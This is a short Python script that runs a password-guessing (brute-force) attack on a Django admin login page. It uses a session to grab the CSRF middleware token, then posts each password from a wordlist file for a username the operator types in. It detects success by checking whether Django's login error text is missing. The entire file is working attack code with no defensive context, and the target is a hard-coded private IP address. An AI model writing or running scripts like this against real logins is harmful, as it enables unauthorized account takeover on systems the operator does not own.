#!/usr/bin/python3
from termcolor import colored
import requests
from bs4 import BeautifulSoup as bs
import lxml


#csrfmiddlewaretoken=X7QB3k7Ilj7e1CwpFUt3Ah1Zzfw9HWtlvE0DL5sHRB1XFTMtH7hYjnaXesmeEWFW&username=admin&password=password
#User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0

#for maintaing the session
s=requests.Session()
#Change a URL
url='http://192.168.43.156/admin/login/?next=/admin/'
res=s.get(url)

#grep the  middelware token 
soup=bs(res.text,'lxml')
value=soup.find('input',{'name':'csrfmiddlewaretoken'})['value']
#print(value)

#headers
headers={'User-Agent':'Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0'}


def login(username):
	#change the passwordlist
	with open('pass.txt','r') as passwd:
		for password in passwd:
			#print(user.strip('\n'),password.strip('\n'))
			data={'csrfmiddlewaretoken':value,'username':username,'password':password.strip('\n'),'next':'/admin/'}
			response=s.post(url=url,data=data,headers=headers)
			if 'Please enter the correct username and password for a staff account' in response.text:
				print(colored("[-] Trying->"+username+":"+password.strip('\n'),'red'))
			else:
				print(colored("[+] Success....!!!"+username+":"+password.strip('\n'),'green'))
				exit()
		print("[-] Password Not Found...!!!")




username=str(input("Enter the username >>> "))
login(username.strip('\n'))

